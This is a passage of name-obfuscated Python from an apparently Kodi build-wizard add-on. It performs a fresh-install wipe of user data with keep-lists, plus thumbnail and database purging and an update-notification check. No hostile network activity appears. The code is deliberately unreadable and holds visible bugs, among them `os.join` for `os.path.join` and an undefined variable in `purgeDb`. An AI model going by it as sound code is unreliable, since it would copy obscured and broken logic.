				elif O00O0O00O0000OOOO [O0O00OOOO000000OO -2 ]=='userdata'and O00O0O00O0000OOOO [O0O00OOOO000000OO -1 ]=='addon_data'and 'skin.anonymous.mod'in O00O0O00O0000OOOO [O0O00OOOO000000OO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:4960
				elif O00O0O00O0000OOOO [O0O00OOOO000000OO -2 ]=='userdata'and O00O0O00O0000OOOO [O0O00OOOO000000OO -1 ]=='addon_data'and 'skin.Premium.mod'in O00O0O00O0000OOOO [O0O00OOOO000000OO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:4961
				elif O00O0O00O0000OOOO [O0O00OOOO000000OO -2 ]=='userdata'and O00O0O00O0000OOOO [O0O00OOOO000000OO -1 ]=='addon_data'and 'skin.anonymous.nox'in O00O0O00O0000OOOO [O0O00OOOO000000OO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:4962
				elif O00O0O00O0000OOOO [O0O00OOOO000000OO -2 ]=='userdata'and O00O0O00O0000OOOO [O0O00OOOO000000OO -1 ]=='addon_data'and 'skin.phenomenal'in O00O0O00O0000OOOO [O0O00OOOO000000OO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:4963
				elif O00O0O00O0000OOOO [O0O00OOOO000000OO -2 ]=='userdata'and O00O0O00O0000OOOO [O0O00OOOO000000OO -1 ]=='addon_data'and 'plugin.video.metalliq'in O00O0O00O0000OOOO [O0O00OOOO000000OO ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:4964
				elif O00O0O00O0000OOOO [O0O00OOOO000000OO -2 ]=='userdata'and O00O0O00O0000OOOO [O0O00OOOO000000OO -1 ]=='addon_data'and 'skin.titan'in O00O0O00O0000OOOO [O0O00OOOO000000OO ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:4966
				elif O00O0O00O0000OOOO [O0O00OOOO000000OO -2 ]=='userdata'and O00O0O00O0000OOOO [O0O00OOOO000000OO -1 ]=='addon_data'and 'pvr.iptvsimple'in O00O0O00O0000OOOO [O0O00OOOO000000OO ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:4967
				elif OOOOO00OO0OO00000 =='sources.xml'and O00O0O00O0000OOOO [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:4969
				elif OOOOO00OO0OO00000 =='quicknav.DATA.xml'and O00O0O00O0000OOOO [O0O00OOOO000000OO -2 ]=='userdata'and O00O0O00O0000OOOO [O0O00OOOO000000OO -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0O00O0000OOOO [O0O00OOOO000000OO ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:4972
				elif OOOOO00OO0OO00000 =='x1101.DATA.xml'and O00O0O00O0000OOOO [O0O00OOOO000000OO -2 ]=='userdata'and O00O0O00O0000OOOO [O0O00OOOO000000OO -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0O00O0000OOOO [O0O00OOOO000000OO ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:4973
				elif OOOOO00OO0OO00000 =='b-srtym-b.DATA.xml'and O00O0O00O0000OOOO [O0O00OOOO000000OO -2 ]=='userdata'and O00O0O00O0000OOOO [O0O00OOOO000000OO -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0O00O0000OOOO [O0O00OOOO000000OO ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:4974
				elif OOOOO00OO0OO00000 =='x1102.DATA.xml'and O00O0O00O0000OOOO [O0O00OOOO000000OO -2 ]=='userdata'and O00O0O00O0000OOOO [O0O00OOOO000000OO -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0O00O0000OOOO [O0O00OOOO000000OO ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:4975
				elif OOOOO00OO0OO00000 =='b-sdrvt-b.DATA.xml'and O00O0O00O0000OOOO [O0O00OOOO000000OO -2 ]=='userdata'and O00O0O00O0000OOOO [O0O00OOOO000000OO -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0O00O0000OOOO [O0O00OOOO000000OO ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:4976
				elif OOOOO00OO0OO00000 =='x1112.DATA.xml'and O00O0O00O0000OOOO [O0O00OOOO000000OO -2 ]=='userdata'and O00O0O00O0000OOOO [O0O00OOOO000000OO -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0O00O0000OOOO [O0O00OOOO000000OO ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:4977
				elif OOOOO00OO0OO00000 =='b-tlvvyzyh-b.DATA.xml'and O00O0O00O0000OOOO [O0O00OOOO000000OO -2 ]=='userdata'and O00O0O00O0000OOOO [O0O00OOOO000000OO -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0O00O0000OOOO [O0O00OOOO000000OO ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:4978
				elif OOOOO00OO0OO00000 =='x1111.DATA.xml'and O00O0O00O0000OOOO [O0O00OOOO000000OO -2 ]=='userdata'and O00O0O00O0000OOOO [O0O00OOOO000000OO -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0O00O0000OOOO [O0O00OOOO000000OO ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:4979
				elif OOOOO00OO0OO00000 =='b-tvknyshrly-b.DATA.xml'and O00O0O00O0000OOOO [O0O00OOOO000000OO -2 ]=='userdata'and O00O0O00O0000OOOO [O0O00OOOO000000OO -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0O00O0000OOOO [O0O00OOOO000000OO ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:4980
				elif OOOOO00OO0OO00000 =='x1110.DATA.xml'and O00O0O00O0000OOOO [O0O00OOOO000000OO -2 ]=='userdata'and O00O0O00O0000OOOO [O0O00OOOO000000OO -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0O00O0000OOOO [O0O00OOOO000000OO ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:4981
				elif OOOOO00OO0OO00000 =='b-yldym-b.DATA.xml'and O00O0O00O0000OOOO [O0O00OOOO000000OO -2 ]=='userdata'and O00O0O00O0000OOOO [O0O00OOOO000000OO -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0O00O0000OOOO [O0O00OOOO000000OO ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:4982
				elif OOOOO00OO0OO00000 =='x1114.DATA.xml'and O00O0O00O0000OOOO [O0O00OOOO000000OO -2 ]=='userdata'and O00O0O00O0000OOOO [O0O00OOOO000000OO -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0O00O0000OOOO [O0O00OOOO000000OO ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:4983
				elif OOOOO00OO0OO00000 =='b-mvzyqh-b.DATA.xml'and O00O0O00O0000OOOO [O0O00OOOO000000OO -2 ]=='userdata'and O00O0O00O0000OOOO [O0O00OOOO000000OO -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0O00O0000OOOO [O0O00OOOO000000OO ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:4984
				elif OOOOO00OO0OO00000 =='mainmenu.DATA.xml'and O00O0O00O0000OOOO [O0O00OOOO000000OO -2 ]=='userdata'and O00O0O00O0000OOOO [O0O00OOOO000000OO -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0O00O0000OOOO [O0O00OOOO000000OO ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:4985
				elif OOOOO00OO0OO00000 =='skin.Premium.mod.properties'and O00O0O00O0000OOOO [O0O00OOOO000000OO -2 ]=='userdata'and O00O0O00O0000OOOO [O0O00OOOO000000OO -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0O00O0000OOOO [O0O00OOOO000000OO ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:4986
				elif OOOOO00OO0OO00000 =='x1122.DATA.xml'and O00O0O00O0000OOOO [O0O00OOOO000000OO -2 ]=='userdata'and O00O0O00O0000OOOO [O0O00OOOO000000OO -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0O00O0000OOOO [O0O00OOOO000000OO ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:4988
				elif OOOOO00OO0OO00000 =='b-spvrt-b.DATA.xml'and O00O0O00O0000OOOO [O0O00OOOO000000OO -2 ]=='userdata'and O00O0O00O0000OOOO [O0O00OOOO000000OO -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0O00O0000OOOO [O0O00OOOO000000OO ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:4989
				elif OOOOO00OO0OO00000 =='favourites.xml'and O00O0O00O0000OOOO [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:4994
				elif OOOOO00OO0OO00000 =='guisettings.xml'and O00O0O00O0000OOOO [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:4996
				elif OOOOO00OO0OO00000 =='profiles.xml'and O00O0O00O0000OOOO [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:4997
				elif OOOOO00OO0OO00000 =='advancedsettings.xml'and O00O0O00O0000OOOO [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:4998
				elif O00O0O00O0000OOOO [O0O00OOOO000000OO -2 ]=='userdata'and O00O0O00O0000OOOO [O0O00OOOO000000OO -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in O00O0O00O0000OOOO [O0O00OOOO000000OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:4999
				elif O00O0O00O0000OOOO [O0O00OOOO000000OO -2 ]=='userdata'and O00O0O00O0000OOOO [O0O00OOOO000000OO -1 ]=='addon_data'and 'program.apollo'in O00O0O00O0000OOOO [O0O00OOOO000000OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:5000
				elif O00O0O00O0000OOOO [O0O00OOOO000000OO -2 ]=='userdata'and O00O0O00O0000OOOO [O0O00OOOO000000OO -1 ]=='addon_data'and 'plugin.video.allmoviesin'in O00O0O00O0000OOOO [O0O00OOOO000000OO ]and KEEPVICTORY =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:5001
				elif O00O0O00O0000OOOO [O0O00OOOO000000OO -2 ]=='userdata'and O00O0O00O0000OOOO [O0O00OOOO000000OO -1 ]=='addon_data'and 'plugin.video.telemedia'in O00O0O00O0000OOOO [O0O00OOOO000000OO ]and KEEPTELEMEDIA =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:5002
				elif O00O0O00O0000OOOO [O0O00OOOO000000OO -2 ]=='userdata'and O00O0O00O0000OOOO [O0O00OOOO000000OO -1 ]=='addon_data'and 'plugin.video.elementum'in O00O0O00O0000OOOO [O0O00OOOO000000OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:5005
				elif O00O0O00O0000OOOO [O0O00OOOO000000OO -2 ]=='userdata'and O00O0O00O0000OOOO [O0O00OOOO000000OO -1 ]=='addon_data'and 'plugin.audio.soundcloud'in O00O0O00O0000OOOO [O0O00OOOO000000OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:5007
				elif O00O0O00O0000OOOO [O0O00OOOO000000OO -2 ]=='userdata'and O00O0O00O0000OOOO [O0O00OOOO000000OO -1 ]=='addon_data'and 'weather.yahoo'in O00O0O00O0000OOOO [O0O00OOOO000000OO ]and KEEPWEATHER =='true':wiz .log ("Keep weather: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:5008
				elif O00O0O00O0000OOOO [O0O00OOOO000000OO -2 ]=='userdata'and O00O0O00O0000OOOO [O0O00OOOO000000OO -1 ]=='addon_data'and 'plugin.video.quasar'in O00O0O00O0000OOOO [O0O00OOOO000000OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:5009
				elif O00O0O00O0000OOOO [O0O00OOOO000000OO -2 ]=='userdata'and O00O0O00O0000OOOO [O0O00OOOO000000OO -1 ]=='addon_data'and 'program.apollo'in O00O0O00O0000OOOO [O0O00OOOO000000OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:5010
				elif O00O0O00O0000OOOO [O0O00OOOO000000OO -2 ]=='userdata'and O00O0O00O0000OOOO [O0O00OOOO000000OO -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in O00O0O00O0000OOOO [O0O00OOOO000000OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:5011
				elif O00O0O00O0000OOOO [O0O00OOOO000000OO -2 ]=='userdata'and O00O0O00O0000OOOO [O0O00OOOO000000OO -1 ]=='addon_data'and 'plugin.video.playlistLoader'in O00O0O00O0000OOOO [O0O00OOOO000000OO ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:5012
				elif OOOOO00OO0OO00000 in LOGFILES :wiz .log ("Keep Log File: %s"%OOOOO00OO0OO00000 ,xbmc .LOGNOTICE )#line:5013
				elif OOOOO00OO0OO00000 .endswith ('.db'):#line:5014
					try :#line:5015
						if OOOOO00OO0OO00000 ==OOOOOO0OOO0O0O0O0 and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(OOOOO00OO0OO00000 ,KODIV ),xbmc .LOGNOTICE )#line:5016
						else :os .remove (os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ))#line:5017
					except Exception as OOOOOO00000OOO0O0 :#line:5018
						if not OOOOO00OO0OO00000 .startswith ('Textures13'):#line:5019
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:5020
							wiz .log ("-> %s"%(str (OOOOOO00000OOO0O0 )),xbmc .LOGNOTICE )#line:5021
							wiz .purgeDb (os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ))#line:5022
				else :#line:5023
					DP .update (int (wiz .percentage (O0O00O0OO00OO0000 ,OOOO00O00OO0OOOO0 )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOO00OO0OO00000 ),'')#line:5024
					try :os .remove (os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ))#line:5025
					except Exception as OOOOOO00000OOO0O0 :#line:5026
						wiz .log ("Error removing %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:5027
						wiz .log ("-> / %s"%(str (OOOOOO00000OOO0O0 )),xbmc .LOGNOTICE )#line:5028
			if DP .iscanceled ():#line:5029
				DP .close ()#line:5030
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5031
				return False #line:5032
		for O00OOOO000O000000 ,O0O00O00O0O000OOO ,OO0OO0OO000O0O000 in os .walk (OO000O0OOOO0000O0 ,topdown =True ):#line:5033
			O0O00O00O0O000OOO [:]=[O0O0OOO0OOOOOO00O for O0O0OOO0OOOOOO00O in O0O00O00O0O000OOO if O0O0OOO0OOOOOO00O not in EXCLUDES ]#line:5034
			for OOOOO00OO0OO00000 in O0O00O00O0O000OOO :#line:5035
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OOOOO00OO0OO00000 ),'')#line:5036
			  if OOOOO00OO0OO00000 not in ["Database","userdata","temp","addons","addon_data"]:#line:5037
			   if not (OOOOO00OO0OO00000 =='script.skinshortcuts'and KEEPSKIN =='true'):#line:5038
			    if not (OOOOO00OO0OO00000 =='skin.titan'and KEEPSKIN3 =='true'):#line:5040
			      if not (OOOOO00OO0OO00000 =='pvr.iptvsimple'and KEEPPVR =='true'):#line:5041
			       if not (OOOOO00OO0OO00000 =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:5042
			        if not (OOOOO00OO0OO00000 =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:5043
			         if not (OOOOO00OO0OO00000 =='program.apollo'and KEEPINFO =='true'):#line:5044
			          if not (OOOOO00OO0OO00000 =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:5045
			           if not (OOOOO00OO0OO00000 =='weather.yahoo'and KEEPWEATHER =='true'):#line:5046
			            if not (OOOOO00OO0OO00000 =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:5047
			             if not (OOOOO00OO0OO00000 =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:5048
			              if not (OOOOO00OO0OO00000 =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:5049
			               if not (OOOOO00OO0OO00000 =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:5050
			                if not (OOOOO00OO0OO00000 =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:5051
			                 if not (OOOOO00OO0OO00000 =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:5052
			                  if not (OOOOO00OO0OO00000 =='plugin.video.neptune'and KEEPINFO =='true'):#line:5053
			                   if not (OOOOO00OO0OO00000 =='plugin.video.youtube'and KEEPINFO =='true'):#line:5054
			                    if not (OOOOO00OO0OO00000 =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:5055
			                     if not (OOOOO00OO0OO00000 =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:5056
			                      if not (OOOOO00OO0OO00000 =='plugin.video.allmoviesin'and KEEPVICTORY =='true'):#line:5057
			                       if not (OOOOO00OO0OO00000 =='plugin.video.telemedia'and KEEPTELEMEDIA =='true'):#line:5058
			                           if not (OOOOO00OO0OO00000 =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:5062
			                            if not (OOOOO00OO0OO00000 =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:5063
			                             if not (OOOOO00OO0OO00000 =='plugin.video.torrenter'and KEEPINFO =='true'):#line:5064
			                              if not (OOOOO00OO0OO00000 =='plugin.video.quasar'and KEEPINFO =='true'):#line:5065
			                               if not (OOOOO00OO0OO00000 =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:5066
			                                  shutil .rmtree (os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),ignore_errors =True ,onerror =None )#line:5068
			if DP .iscanceled ():#line:5069
				DP .close ()#line:5070
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5071
				return False #line:5072
		DP .close ()#line:5073
		wiz .clearS ('build')#line:5074
		if over ==True :#line:5075
			return True #line:5076
		elif install =='restore':#line:5077
			return True #line:5078
		elif install :#line:5079
			buildWizard (install ,'normal',over =True )#line:5080
		else :#line:5081
			if INSTALLMETHOD ==1 :O0O0000OOOOOOOOOO =1 #line:5082
			elif INSTALLMETHOD ==2 :O0O0000OOOOOOOOOO =0 #line:5083
			else :O0O0000OOOOOOOOOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:5084
			if O0O0000OOOOOOOOOO ==1 :wiz .reloadFix ('fresh')#line:5085
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:5086
	else :#line:5087
		if not install =='restore':#line:5088
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:5089
			wiz .refresh ()#line:5090
def clearCache ():#line:5095
		wiz .clearCache ()#line:5096
def fixwizard ():#line:5100
		wiz .fixwizard ()#line:5101
def totalClean ():#line:5103
		wiz .clearCache ()#line:5105
		wiz .clearPackages ('total')#line:5106
		clearThumb ('total')#line:5107
		cleanfornewbuild ()#line:5108
def cleanfornewbuild ():#line:5109
		try :#line:5110
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:5111
		except :#line:5112
			pass #line:5113
		try :#line:5114
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:5115
		except :#line:5116
			pass #line:5117
		try :#line:5118
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:5119
		except :#line:5120
			pass #line:5121
def clearThumb (type =None ):#line:5122
	OO00O00OOOOO00000 =wiz .latestDB ('Textures')#line:5123
	if not type ==None :O00O0OOOOOOO00000 =1 #line:5124
	else :O00O0OOOOOOO00000 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,OO00O00OOOOO00000 ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:5125
	if O00O0OOOOOOO00000 ==1 :#line:5126
		try :wiz .removeFile (os .join (DATABASE ,OO00O00OOOOO00000 ))#line:5127
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (OO00O00OOOOO00000 )#line:5128
		wiz .removeFolder (THUMBS )#line:5129
	else :wiz .log ('Clear thumbnames cancelled')#line:5131
	wiz .redoThumbs ()#line:5132
def purgeDb ():#line:5134
	O00O000000000OOOO =[];O00OOO00OOOO0O0O0 =[]#line:5135
	for OO00OO0OO00000O0O ,OOO0OOO0000O0OO00 ,O0OO0O0OO0OO0OOOO in os .walk (HOME ):#line:5136
		for OO0O0O0000000OO0O in fnmatch .filter (O0OO0O0OO0OO0OOOO ,'*.db'):#line:5137
			if OO0O0O0000000OO0O !='Thumbs.db':#line:5138
				OO00O0OOOOO00000O =os .path .join (OO00OO0OO00000O0O ,OO0O0O0000000OO0O )#line:5139
				O00O000000000OOOO .append (OO00O0OOOOO00000O )#line:5140
				O0OOOO0000O0OOOOO =OO00O0OOOOO00000O .replace ('\\','/').split ('/')#line:5141
				O00OOO00OOOO0O0O0 .append ('(%s) %s'%(O0OOOO0000O0OOOOO [len (O0OOOO0000O0OOOOO )-2 ],O0OOOO0000O0OOOOO [len (O0OOOO0000O0OOOOO )-1 ]))#line:5142
	if KODIV >=16 :#line:5143
		O000OO00O00OO0OO0 =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O00OOO00OOOO0O0O0 )#line:5144
		if O000OO00O00OO0OO0 ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5145
		elif len (O000OO00O00OO0OO0 )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5146
		else :#line:5147
			for OO00O00O00O0O0OO0 in O000OO00O00OO0OO0 :wiz .purgeDb (O00O000000000OOOO [OO00O00O00O0O0OO0 ])#line:5148
	else :#line:5149
		O000OO00O00OO0OO0 =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O00OOO00OOOO0O0O0 )#line:5150
		if O000OO00O00OO0OO0 ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5151
		else :wiz .purgeDb (O00O000000000OOOO [OO00O00O00O0O0OO0 ])#line:5152
def fastupdatefirstbuild (O0OOOOO0000OOOO00 ):#line:5158
	wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5160
	if ENABLE =='Yes':#line:5161
		if not NOTIFY =='true':#line:5162
			O0OO0OO0O0000O000 =wiz .workingURL (NOTIFICATION )#line:5163
			if O0OO0OO0O0000O000 ==True :#line:5164
				OOO00O000O0OOO0OO ,OO0OO0OO0OOO0OO0O =wiz .splitNotify (NOTIFICATION )#line:5165
				if not OOO00O000O0OOO0OO ==False :#line:5167
					try :#line:5168
						OOO00O000O0OOO0OO =int (OOO00O000O0OOO0OO );O0OOOOO0000OOOO00 =int (O0OOOOO0000OOOO00 )#line:5169
						checkidupdate ()#line:5170
						wiz .setS ("notedismiss","true")#line:5171
						if OOO00O000O0OOO0OO ==O0OOOOO0000OOOO00 :#line:5172
							wiz .log ("[Notifications] id[%s] Dismissed"%int (OOO00O000O0OOO0OO ),xbmc .LOGNOTICE )#line:5173
						elif OOO00O000O0OOO0OO >O0OOOOO0000OOOO00 :#line:5175
							wiz .log ("[Notifications] id: %s"%str (OOO00O000O0OOO0OO ),xbmc .LOGNOTICE )#line:5176
							wiz .setS ('noteid',str (OOO00O000O0OOO0OO ))#line:5177
							wiz .setS ("notedismiss","true")#line:5178
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5181
					except Exception as OO000O0OOO0O0OO0O :#line:5182
						wiz .log ("Error on Notifications Window: %s"%str (OO000O0OOO0O0OO0O ),xbmc .LOGERROR )#line:5183
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5185
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,O0OO0OO0O0000O000 ),xbmc .LOGNOTICE )#line:5186
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5187
